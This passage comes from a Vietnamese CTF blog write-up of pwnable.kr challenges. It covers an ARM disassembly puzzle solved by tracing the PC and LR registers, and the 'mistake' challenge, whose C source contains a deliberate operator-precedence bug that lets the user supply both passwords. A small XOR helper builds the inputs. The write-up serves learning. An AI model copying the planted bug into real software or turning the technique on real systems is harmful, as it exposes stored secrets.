class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function main:</span><br><span class="line">   <span class="number">0x00008d3c</span> &lt;+<span class="number">0</span>&gt;:	push	&#123;r4, r11, lr&#125;</span><br><span class="line">   <span class="number">0x00008d40</span> &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">8</span></span><br><span class="line">   <span class="number">0x00008d44</span> &lt;+<span class="number">8</span>&gt;:	sub	sp, sp, #<span class="number">12</span></span><br><span class="line">   <span class="number">0x00008d48</span> &lt;+<span class="number">12</span>&gt;:	mov	r3, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008d4c</span> &lt;+<span class="number">16</span>&gt;:	str	r3, [r11, #<span class="number">-16</span>]</span><br><span class="line">   <span class="number">0x00008d50</span> &lt;+<span class="number">20</span>&gt;:	ldr	r0, [pc, #<span class="number">104</span>]	; <span class="number">0x8dc0</span> &lt;main+<span class="number">132</span>&gt;</span><br><span class="line">   <span class="number">0x00008d54</span> &lt;+<span class="number">24</span>&gt;:	bl	<span class="number">0xfb6c</span> &lt;<span class="built_in">printf</span>&gt;</span><br><span class="line">   <span class="number">0x00008d58</span> &lt;+<span class="number">28</span>&gt;:	sub	r3, r11, #<span class="number">16</span></span><br><span class="line">   <span class="number">0x00008d5c</span> &lt;+<span class="number">32</span>&gt;:	ldr	r0, [pc, #<span class="number">96</span>]	; <span class="number">0x8dc4</span> &lt;main+<span class="number">136</span>&gt;</span><br><span class="line">   <span class="number">0x00008d60</span> &lt;+<span class="number">36</span>&gt;:	mov	r1, r3</span><br><span class="line">   <span class="number">0x00008d64</span> &lt;+<span class="number">40</span>&gt;:	bl	<span class="number">0xfbd8</span> &lt;__isoc99_scanf&gt;</span><br><span class="line">   <span class="number">0x00008d68</span> &lt;+<span class="number">44</span>&gt;:	bl	<span class="number">0x8cd4</span> &lt;key1&gt;</span><br><span class="line">   <span class="number">0x00008d6c</span> &lt;+<span class="number">48</span>&gt;:	mov	r4, r0</span><br><span class="line">   <span class="number">0x00008d70</span> &lt;+<span class="number">52</span>&gt;:	bl	<span class="number">0x8cf0</span> &lt;key2&gt;</span><br><span class="line">   <span class="number">0x00008d74</span> &lt;+<span class="number">56</span>&gt;:	mov	r3, r0</span><br><span class="line">   <span class="number">0x00008d78</span> &lt;+<span class="number">60</span>&gt;:	add	r4, r4, r3</span><br><span class="line">   <span class="number">0x00008d7c</span> &lt;+<span class="number">64</span>&gt;:	bl	<span class="number">0x8d20</span> &lt;key3&gt;</span><br><span class="line">   <span class="number">0x00008d80</span> &lt;+<span class="number">68</span>&gt;:	mov	r3, r0</span><br><span class="line">   <span class="number">0x00008d84</span> &lt;+<span class="number">72</span>&gt;:	add	r2, r4, r3</span><br><span class="line">   <span class="number">0x00008d88</span> &lt;+<span class="number">76</span>&gt;:	ldr	r3, [r11, #<span class="number">-16</span>]</span><br><span class="line">   <span class="number">0x00008d8c</span> &lt;+<span class="number">80</span>&gt;:	cmp	r2, r3</span><br><span class="line">   <span class="number">0x00008d90</span> &lt;+<span class="number">84</span>&gt;:	bne	<span class="number">0x8da8</span> &lt;main+<span class="number">108</span>&gt;</span><br><span class="line">   <span class="number">0x00008d94</span> &lt;+<span class="number">88</span>&gt;:	ldr	r0, [pc, #<span class="number">44</span>]	; <span class="number">0x8dc8</span> &lt;main+<span class="number">140</span>&gt;</span><br><span class="line">   <span class="number">0x00008d98</span> &lt;+<span class="number">92</span>&gt;:	bl	<span class="number">0x1050c</span> &lt;<span class="built_in">puts</span>&gt;</span><br><span class="line">   <span class="number">0x00008d9c</span> &lt;+<span class="number">96</span>&gt;:	ldr	r0, [pc, #<span class="number">40</span>]	; <span class="number">0x8dcc</span> &lt;main+<span class="number">144</span>&gt;</span><br><span class="line">   <span class="number">0x00008da0</span> &lt;+<span class="number">100</span>&gt;:	bl	<span class="number">0xf89c</span> &lt;system&gt;</span><br><span class="line">   <span class="number">0x00008da4</span> &lt;+<span class="number">104</span>&gt;:	b	<span class="number">0x8db0</span> &lt;main+<span class="number">116</span>&gt;</span><br><span class="line">   <span class="number">0x00008da8</span> &lt;+<span class="number">108</span>&gt;:	ldr	r0, [pc, #<span class="number">32</span>]	; <span class="number">0x8dd0</span> &lt;main+<span class="number">148</span>&gt;</span><br><span class="line">   <span class="number">0x00008dac</span> &lt;+<span class="number">112</span>&gt;:	bl	<span class="number">0x1050c</span> &lt;<span class="built_in">puts</span>&gt;</span><br><span class="line">   <span class="number">0x00008db0</span> &lt;+<span class="number">116</span>&gt;:	mov	r3, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008db4</span> &lt;+<span class="number">120</span>&gt;:	mov	r0, r3</span><br><span class="line">   <span class="number">0x00008db8</span> &lt;+<span class="number">124</span>&gt;:	sub	sp, r11, #<span class="number">8</span></span><br><span class="line">   <span class="number">0x00008dbc</span> &lt;+<span class="number">128</span>&gt;:	pop	&#123;r4, r11, pc&#125;</span><br><span class="line">   <span class="number">0x00008dc0</span> &lt;+<span class="number">132</span>&gt;:	andeq	r10, r6, r12, lsl #<span class="number">9</span></span><br><span class="line">   <span class="number">0x00008dc4</span> &lt;+<span class="number">136</span>&gt;:	andeq	r10, r6, r12, lsr #<span class="number">9</span></span><br><span class="line">   <span class="number">0x00008dc8</span> &lt;+<span class="number">140</span>&gt;:			; &lt;UNDEFINED&gt; instruction: <span class="number">0x0006a4b0</span></span><br><span class="line">   <span class="number">0x00008dcc</span> &lt;+<span class="number">144</span>&gt;:			; &lt;UNDEFINED&gt; instruction: <span class="number">0x0006a4bc</span></span><br><span class="line">   <span class="number">0x00008dd0</span> &lt;+<span class="number">148</span>&gt;:	andeq	r10, r6, r4, asr #<span class="number">9</span></span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function key1:</span><br><span class="line">   <span class="number">0x00008cd4</span> &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #<span class="number">-4</span>]!)</span><br><span class="line">   <span class="number">0x00008cd8</span> &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008cdc</span> &lt;+<span class="number">8</span>&gt;:	mov	r3, pc</span><br><span class="line">   <span class="number">0x00008ce0</span> &lt;+<span class="number">12</span>&gt;:	mov	r0, r3</span><br><span class="line">   <span class="number">0x00008ce4</span> &lt;+<span class="number">16</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008ce8</span> &lt;+<span class="number">20</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">   <span class="number">0x00008cec</span> &lt;+<span class="number">24</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function key2:</span><br><span class="line">   <span class="number">0x00008cf0</span> &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #<span class="number">-4</span>]!)</span><br><span class="line">   <span class="number">0x00008cf4</span> &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008cf8</span> &lt;+<span class="number">8</span>&gt;:	push	&#123;r6&#125;		; (str r6, [sp, #<span class="number">-4</span>]!)</span><br><span class="line">   <span class="number">0x00008cfc</span> &lt;+<span class="number">12</span>&gt;:	add	r6, pc, #<span class="number">1</span></span><br><span class="line">   <span class="number">0x00008d00</span> &lt;+<span class="number">16</span>&gt;:	bx	r6</span><br><span class="line">   <span class="number">0x00008d04</span> &lt;+<span class="number">20</span>&gt;:	mov	r3, pc</span><br><span class="line">   <span class="number">0x00008d06</span> &lt;+<span class="number">22</span>&gt;:	adds	r3, #<span class="number">4</span></span><br><span class="line">   <span class="number">0x00008d08</span> &lt;+<span class="number">24</span>&gt;:	push	&#123;r3&#125;</span><br><span class="line">   <span class="number">0x00008d0a</span> &lt;+<span class="number">26</span>&gt;:	pop	&#123;pc&#125;</span><br><span class="line">   <span class="number">0x00008d0c</span> &lt;+<span class="number">28</span>&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #<span class="number">4</span>)</span><br><span class="line">   <span class="number">0x00008d10</span> &lt;+<span class="number">32</span>&gt;:	mov	r0, r3</span><br><span class="line">   <span class="number">0x00008d14</span> &lt;+<span class="number">36</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008d18</span> &lt;+<span class="number">40</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">   <span class="number">0x00008d1c</span> &lt;+<span class="number">44</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function key3:</span><br><span class="line">   <span class="number">0x00008d20</span> &lt;+<span class="number">0</span>&gt;:	push	&#123;r11&#125;		; (str r11, [sp, #<span class="number">-4</span>]!)</span><br><span class="line">   <span class="number">0x00008d24</span> &lt;+<span class="number">4</span>&gt;:	add	r11, sp, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008d28</span> &lt;+<span class="number">8</span>&gt;:	mov	r3, lr</span><br><span class="line">   <span class="number">0x00008d2c</span> &lt;+<span class="number">12</span>&gt;:	mov	r0, r3</span><br><span class="line">   <span class="number">0x00008d30</span> &lt;+<span class="number">16</span>&gt;:	sub	sp, r11, #<span class="number">0</span></span><br><span class="line">   <span class="number">0x00008d34</span> &lt;+<span class="number">20</span>&gt;:	pop	&#123;r11&#125;		; (ldr r11, [sp], #<span class="number">4</span>)</span><br><span class="line">   <span class="number">0x00008d38</span> &lt;+<span class="number">24</span>&gt;:	bx	lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution"></a>Solution</h2><p>Chương trình gốc hiểu đơn giản là lấy 3 giá trị của 3 hàm <code>key</code> tính toán rồi so với input của mình. Mục tiêu là tính 3 giá trị đó. Không nhận được binary mà là 1 file asm và với địa chỉ như thế mình nghĩ chương trình là địa chỉ tĩnh. Nên mọi thứ có thể tính được dựa vào file asm. </p>
<p>Với các hàm <code>key</code> thì mình thấy nó không được gọi lệnh trả về nhưng vẫn thu được giá trị. Mình nôm na nghĩ tới việc giá trị sẽ được gán vào thanh ghi nào đó tương tự như <code>EAX</code> → File asm sẽ có ích cho việc này. Thì qua tìm hiểu mình biết được rằng giá trị trả về sẽ được gán vào thanh ghi <code>r0</code>, vậy thì với mỗi hàm key mình sẽ follow giá trị <code>r0</code> là được. </p>
<p><code>key1()</code> : <code>pc</code> là thanh ghi trỏ tới địa chỉ của câu lệnh hiện tại + 8, khi chạy tới địa chỉ <code>0x00008cdc</code> thì thanh ghi <code>pc= 0x00008cdc+8 = 0x8ce4</code> rồi gán cho <code>r3</code> và rồi gán cho <code>r0</code> </p>
<p><code>→ r0 = 0x8ce4</code> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00008cdc</span> &lt;+<span class="number">8</span>&gt;:	mov	r3, pc</span><br><span class="line"><span class="number">0x00008ce0</span> &lt;+<span class="number">12</span>&gt;:	mov	r0, r3</span><br></pre></td></tr></table></figure>

<p><code>key2()</code> : với 2 dòng đầu tiên có chức năng đổi mode hiện tại là ARM sang THUMB, thì <code>pc</code> sẽ bước ngắn hơn, giá trị pc sẽ là +4 thay vì +8. Thêm lệnh adds là +4 cho r3 trước khi gán cho r0</p>
<p><code>→ pc = 0x00008d04+4 = 0x8d08 , r3 = 0x8d08+4 = 0x8d0c, r0 = 0x8d0c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00008cfc</span> &lt;+<span class="number">12</span>&gt;:	add	r6, pc, #<span class="number">1</span></span><br><span class="line"><span class="number">0x00008d00</span> &lt;+<span class="number">16</span>&gt;:	bx	r6</span><br><span class="line"><span class="number">0x00008d04</span> &lt;+<span class="number">20</span>&gt;:	mov	r3, pc</span><br><span class="line"><span class="number">0x00008d06</span> &lt;+<span class="number">22</span>&gt;:	adds	r3, #<span class="number">4</span></span><br><span class="line"><span class="number">0x00008d08</span> &lt;+<span class="number">24</span>&gt;:	push	&#123;r3&#125;</span><br><span class="line"><span class="number">0x00008d0a</span> &lt;+<span class="number">26</span>&gt;:	pop	&#123;pc&#125;</span><br><span class="line"><span class="number">0x00008d0c</span> &lt;+<span class="number">28</span>&gt;:	pop	&#123;r6&#125;		; (ldr r6, [sp], #<span class="number">4</span>)</span><br><span class="line"><span class="number">0x00008d10</span> &lt;+<span class="number">32</span>&gt;:	mov	r0, r3</span><br></pre></td></tr></table></figure>

<p><code>key3()</code> : lr là thanh ghi trỏ tới địa chỉ trả về (giống như 1 thanh ghi mang giá trị RIP). Thì sau khi hàm <code>key3</code> thực thi xong, nó sẽ tiếp tục trỏ tới 1 lệnh nào đó trong main thì <code>lr</code> sẽ mang giá trị đó. </p>
<p><code>→ r0 = 0x00008d80</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00008d28</span> &lt;+<span class="number">8</span>&gt;:	mov	r3, lr</span><br><span class="line"><span class="number">0x00008d2c</span> &lt;+<span class="number">12</span>&gt;:	mov	r0, r3</span><br></pre></td></tr></table></figure>

<p>Tổng kết giá trị ta có : <code>0x8ce4 + 0x8d0c + 0x00008d80 = 0x1a770</code></p>
<h1 id="Mistake"><a href="#Mistake" class="headerlink" title="Mistake"></a>Mistake</h1><h2 id="Description-7"><a href="#Description-7" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">We all make mistakes, let<span class="string">&#x27;s move on.</span></span><br><span class="line"><span class="string">(don&#x27;</span>t take this too seriously, no fancy hacking skill is required at all)</span><br><span class="line">This task is based on real event</span><br><span class="line"></span><br><span class="line">ssh mistake@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<h2 id="Source-7"><a href="#Source-7" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="keyword">if</span>(fd=open(<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;do not bruteforce...\n&quot;</span>);</span><br><span class="line">	sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="type">int</span> len;</span><br><span class="line">	<span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;input password : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%10s&quot;</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// xor your input</span></span><br><span class="line">	xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Password OK\n&quot;</span>);</span><br><span class="line">		setregid(getegid(), getegid());</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Wrong Password\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2><p>Lỗi là ở đây :<br><code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code></p>
<p>Thứ tự thực thi đã bị sai khi nó gọi <code>open</code> xong thì tới phép so sánh <code>&lt;</code> rồi mới tới gán giá trị cho <code>fd</code>.</p>
<p>thành ra khi mở thành công thì sẽ trả về giá trị file descriptor của file vừa mở, đem đi so sánh với 0, giả sử file descriptor ở đây là 3 thì 3 &lt; 0 là sai → trả về 0 và gán 0 cho biến <code>fd</code>, biến câu lệnh sau thành lệnh đọc input từ stdin :</p>
<p><code>if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))</code></p>
<p>Rồi thì với logic là <code>pw_buf</code> là biến do mình kiểm soát thay vì trong file password, đem so sánh với biến <code>pw_buf2</code> được qua phép xor của mình thì cả 2 giá trị đều do mình kiểm soát. Thế là xong</p>
<h2 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h2><p>ở đây mình chạy lại output của hàm xor với 1 chuỗi dài 10 kí tự bất kì để thu output. Khi đó chạy chương trình và nhập cả 2 giá trị vào thoi :&gt; </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XORKEY 1</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor</span><span class="params">(<span class="type">char</span> *s, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s[i] ^= XORKEY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> d[] = <span class="string">&quot;1234567890&quot;</span>;</span><br><span class="line">    <span class="type">char</span> *c = d;</span><br><span class="line">    xor(d, <span class="built_in">strlen</span>(d));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, d); <span class="comment">//0325476981</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ôk hết rồi, hẹn các bạn phần sau :&gt; Phần sau mình sẽ clear toàn bộ Todder :&gt;</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://vuk3r.github.io">vuk3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://vuk3r.github.io/2026/02/02/PWNABLE-KR-Phan-1/">https://vuk3r.github.io/2026/02/02/PWNABLE-KR-Phan-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a></div><div class="post-share"><div class="social-share" data-image="/img/post/writeup/pwnable-kr/thumbnail.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/26/PWNABLE-KR-Phan-2/" title="PWNABLE.KR - Phần 2"><img class="cover" src="/img/post/writeup/pwnable-kr/thumbnail.png" onerror="onerror=null;src='/img/error/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">PWNABLE.KR - Phần 2</div></div><div class="info-2"><div class="info-item-1">Đây là phần 2 của series Pwnable.kr của mình. Phần này sẽ là các challenge còn lại của Toddler’s Bottle. No need milk anymore, baby grow up ! coin1Description123Mommy, I wanna play a game!ssh coin1@pwnable.kr -p2222 (pw: guest)  Sourcereadme1nc 0 9007 to get flag!  Solutionnc tới địa chỉ thì ta sẽ bắt đầu được game. Luật game cơ bản là tìm đúng đồng xu trong N đồng xu, và người chơi có C dự đoán và thêm 1 lần nữa để nhập đáp án. Với mỗi lần tìm được thì tính là 1 xu, và ta cần tìm được 100 đồ...</div></div></div></a><a class="pagination-related" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF"><img class="cover" src="/img/post/writeup/picoctf/thumbnail.png" onerror="onerror=null;src='/img/error/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">[Writeup] - Solving Pwn on PicoCTF</div></div><div class="info-2"><div class="info-item-1">Hi guys, this is series clear pwn from medium up to highest difficulty. I write these writeups mainly about the things I’ve learned, so some parts might be detailed while others are brief. Even so, they may still be useful to you if you read them. If you have any questions, free to ask me, Im free to share :&gt; PIE TIME 2Description12345Author: Darkraicg492DescriptionCan you try to get the flag? I&#x27;m not revealing anything anymore!!Additional details will be available after launching you...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/26/PWNABLE-KR-Phan-2/" title="PWNABLE.KR - Phần 2"><img class="cover" src="/img/post/writeup/pwnable-kr/thumbnail.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-26</div><div class="info-item-2">PWNABLE.KR - Phần 2</div></div><div class="info-2"><div class="info-item-1">Đây là phần 2 của series Pwnable.kr của mình. Phần này sẽ là các challenge còn lại của Toddler’s Bottle. No need milk anymore, baby grow up ! coin1Description123Mommy, I wanna play a game!ssh coin1@pwnable.kr -p2222 (pw: guest)  Sourcereadme1nc 0 9007 to get flag!  Solutionnc tới địa chỉ thì ta sẽ bắt đầu được game. Luật game cơ bản là tìm đúng đồng xu trong N đồng xu, và người chơi có C dự đoán và thêm 1 lần nữa để nhập đáp án. Với mỗi lần tìm được thì tính là 1 xu, và ta cần tìm được 100 đồ...</div></div></div></a><a class="pagination-related" href="/2025/08/16/picoCTF_medium(1)/" title="[Writeup] - Solving Pwn on PicoCTF"><img class="cover" src="/img/post/writeup/picoctf/thumbnail.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-17</div><div class="info-item-2">[Writeup] - Solving Pwn on PicoCTF</div></div><div class="info-2"><div class="info-item-1">Hi guys, this is series clear pwn from medium up to highest difficulty. I write these writeups mainly about the things I’ve learned, so some parts might be detailed while others are brief. Even so, they may still be useful to you if you read them. If you have any questions, free to ask me, Im free to share :&gt; PIE TIME 2Description12345Author: Darkraicg492DescriptionCan you try to get the flag? I&#x27;m not revealing anything anymore!!Additional details will be available after launching you...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar/lucy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">vuk3r</div><div class="author-info-description">Learn what we hacked<br>hack what we can't</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/vuk3r"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content"><a href="/about/">>_$(whoami)</a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fd"><span class="toc-number">1.</span> <span class="toc-text">fd</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Source"><span class="toc-number">1.2.</span> <span class="toc-text">Source</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">1.3.</span> <span class="toc-text">Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload"><span class="toc-number">1.4.</span> <span class="toc-text">Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Collision"><span class="toc-number">2.</span> <span class="toc-text">Collision</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Description-1"><span class="toc-number">2.1.</span> <span 